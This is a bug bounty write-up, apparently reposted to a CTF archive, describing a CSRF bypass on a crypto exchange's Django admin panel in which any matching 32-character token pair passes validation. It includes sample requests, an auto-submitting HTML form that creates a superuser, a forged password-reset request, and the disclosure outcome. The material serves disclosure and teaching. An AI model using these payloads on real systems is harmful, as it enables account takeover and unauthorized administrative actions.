# :globe_with_meridians: How I Discovered a Complete CSRF Protection Bypass on a Major Crypto Exchange And What Happened Next

> **Original Source:** [How I Discovered a Complete CSRF Protection Bypass on a Major Crypto Exchange And What Happened Next](https://infosecwriteups.com/how-i-discovered-a-complete-csrf-protection-bypass-on-a-major-crypto-exchange-and-what-happened-10c7fc794324)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# How I Discovered a Complete CSRF Protection Bypass on a Major Crypto Exchange And What Happened Next


*A bug bounty story about persistence, Django internals, and a hard lesson about program scope*

## Introduction


Every bug bounty hunter has that one story — the finding that felt like a breakthrough, only for reality to hit differently. This is mine.


I’m a self-taught security researcher from India, actively hunting bugs on platforms like HackenProof and HackerOne. This is the story of how I discovered a critical CSRF protection bypass on a major cryptocurrency exchange’s admin panel, went through the full disclosure process, and walked away with a valuable lesson that no tutorial could ever teach me.

## The Target


While browsing a public bug bounty program for a well-known crypto exchange platform, I noticed their scope included `*.domain.com` — a wildcard scope. Wildcard scopes are gold for hunters because they cover subdomains that are often overlooked.


While doing basic subdomain enumeration, I came across an interesting subdomain running what appeared to be a Django-based security portal with an admin panel exposed at:


```
/admin/login/?next=/admin/users/
```


An exposed admin panel on a production subdomain of a major crypto exchange? My interest was immediately peaked.

## Understanding CSRF — The Basics


Before I dive in, a quick refresher:


CSRF (Cross-Site Request Forgery) is an attack where a malicious website tricks a logged-in user’s browser into making unwanted requests to another site. Django prevents this using CSRF tokens — a unique cryptographic string that must be present and valid with every state-changing request (POST, PUT, DELETE).


Standard Django CSRF flow:


```
Client requests page → Server sets csrftoken cookie
Client submits form → Must include matching csrfmiddlewaretoken
Server validates → If match: allow. If mismatch: 403 Forbidden
```


## The Discovery


I started with basic recon on the admin panel. First, I captured a normal login request in Burp Suite:


```
POST /admin/login/ HTTP/2
Host: [redacted]
Cookie: csrftoken=gSCQNXJwSImnqeLiW9orLIuESzJ4gLW2
csrfmiddlewaretoken=qSvjwCJL6JxrNfttzjS0...&username=test&password=test
```


Standard Django admin login. Nothing special yet.


Test 1 — Remove CSRF Token Completely:


```
POST /admin/login/ HTTP/2
username=test&password=test
```


Response: `403 Forbidden` — CSRF verification failed.


Good — CSRF protection is active. Or is it?


Test 2 — Send Invalid Token:


```
POST /admin/login/ HTTP/2
csrfmiddlewaretoken=INVALID_TOKEN&username=test&password=test
```


Response: `403 Forbidden`


Still blocking. Makes sense.


Test 3 — Here’s Where It Gets Interesting:


I replaced the CSRF token with a simple 32-character string of repeating “1”s:


```
POST /admin/login/ HTTP/2
Cookie: csrftoken=11111111111111111111111111111111
csrfmiddlewaretoken=11111111111111111111111111111111&username=test&password=test
```


Response: `HTTP/2 200 OK`


```
<p class="errornote">
Please enter the correct username and password for a staff account.
</p>
```


Wait. 200 OK?


The server didn’t reject my request. It passed CSRF validation and moved on to checking my username and password. CSRF protection was completely bypassed using a trivial, arbitrary string.

## Why Does This Happen?


Django’s CSRF middleware by default performs a double-submit cookie check — it compares the `csrftoken` cookie value with the `csrfmiddlewaretoken` form field value. The vulnerability here was that the application was only validating:


Is the token present?
Is it 32 characters long?
Are cookie and form field values matching?


It was NOT cryptographically verifying the token against the server’s `SECRET_KEY`


This means any attacker can craft a CSRF token pair like:


- Cookie: `csrftoken=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

- Form: `csrfmiddlewaretoken=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`


And bypass CSRF protection entirely on every protected endpoint — not just the login page.

## Testing Multiple Arbitrary Strings


To confirm this wasn’t a fluke:


Pattern confirmed: Any 32-character string bypasses CSRF validation.

## The Real-World Impact


This wasn’t just a “login CSRF” issue. Because CSRF protection was format-validated only, every POST endpoint on the application was vulnerable:


1. Forced Admin Actions via Malicious Page:


```
<!-- If admin visits attacker-controlled page -->
<form id="evil" action="https://[target]/admin/users/create/" method="POST">
<input name="csrfmiddlewaretoken" value="00000000000000000000000000000000">
<input name="username" value="backdoor_admin">
<input name="is_superuser" value="true">
</form>
<script>document.getElementById('evil').submit();</script>
```


2. Password Reset Abuse:


```
POST /password-reset/ HTTP/2
csrfmiddlewaretoken=11111111111111111111111111111111
email=victim@company.com
```


No victim interaction required beyond having an account.


## Get Hacker MD’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


3. Sensitive Data Modification:
Any logged-in user could be silently forced to perform account modifications, data changes, or administrative actions.

## Reporting the Vulnerability


I documented everything carefully:


- Burp Suite request/response screenshots

- Multiple token variations tested

- Clear impact analysis

- Step-by-step reproduction steps


I submitted the report to the bug bounty program with severity High, titled:

>

“Complete CSRF Protection Bypass on Admin Panel — Accepts Any 32-Character Token”


Timeline:


```
Day 1: Report submitted
Day 4: Status → "In Review"
Day 10: Triaged! Severity initially Medium (6.9)
Day 14: Severity upgraded to 8.9 (High)
Day 19: Follow-up sent asking for update
Day 25: Triager responds — severity downgraded to 6.9
Day 30+: Company decision received
```


## The Outcome — The Hard Lesson


After the triage process, I received this message from the triage team:

>

“Hello, congratulations on your find. Unfortunately the company said that they by mistake did not show that this is out of scope for them. They are saying sorry and they can pay goodwill for this to not make you upset. I’ll get back to you with the sum.”


Final result:


- Severity: Low (3.9)

- Status: Paid

- Bounty: $50 (goodwill payment)


The company argued the finding fell under their “Login & Logout CSRF” exclusion — which was listed in their out-of-scope section.


Was it fair? Honestly, no. The vulnerability affected all endpoints, not just the login form. The CSRF protection was fundamentally broken application-wide.


But was it my fault for not reading the scope carefully enough? Also yes.

## What I Learned


1. Read Program Rules 3 Times Before Testing


Pay special attention to exclusion lists. “Login CSRF” exclusions are common — know them before you start testing.


2. Distinguish “Login CSRF” from “Complete CSRF Bypass”


These are very different things:


- Login CSRF: Forcing a user to log in as attacker (excluded in most programs)

- Complete CSRF Bypass: CSRF protection broken for ALL endpoints (this is critical)


In your report, explicitly state this difference upfront.


3. Show Impact Beyond the Tested Endpoint


Don’t just demonstrate the bypass on the login page. Show how it affects admin actions, password resets, and other sensitive endpoints. This makes it impossible to categorize as “just login CSRF.”


4. Goodwill $0 → $50 Is Still Better Than $0


Out-of-scope findings usually get nothing. A $50 goodwill shows the company respected your effort even if they couldn’t pay the full amount.


5. Don’t Give Up — Move to the Next Target


One disappointing finding doesn’t define your career. I learned more from this $50 report than from any tutorial.

## Technical Takeaway — How Django CSRF Should Work


For developers reading this, ensure your Django application has proper CSRF configuration:


```
# settings.py — Proper CSRF Configuration
MIDDLEWARE = [
'django.middleware.csrf.CsrfViewMiddleware', # Must be present
...
]

CSRF_COOKIE_SECURE = True # HTTPS only
CSRF_COOKIE_HTTPONLY = True # No JS access
CSRF_COOKIE_SAMESITE = 'Strict' # Strict same-site
CSRF_USE_SESSIONS = True # Session-based (more secure)
```


Django’s CSRF token should be cryptographically tied to the `SECRET_KEY`. If tokens are validated only by format and length, the protection is effectively useless.

## Final Thoughts


Bug bounty hunting is not just about the money. It’s about:


- Understanding how applications work at a deep level

- Learning to think like an attacker

- Building persistence and patience

- Sharing knowledge with the community


This finding taught me that technical skill alone isn’t enough — understanding program scope, business context, and impact communication is equally important.


If you’re a beginner hunter reading this — keep going. Read the scope carefully, document everything, and never stop learning.


And if you’re a developer please validate your CSRF tokens cryptographically, not just by length! 😄


*Happy Hunting! 🎯Follow me for more bug bounty writeups, security research, and real-world vulnerability stories.*


#BugBounty #Cybersecurity #CSRF #Django #Web Security #EthicalHacking #PenetrationTesting #BugBountyTips

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-discovered-a-complete-csrf-protection-bypass-on-a-major-crypto-exchange-and-what-happened-10c7fc794324). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
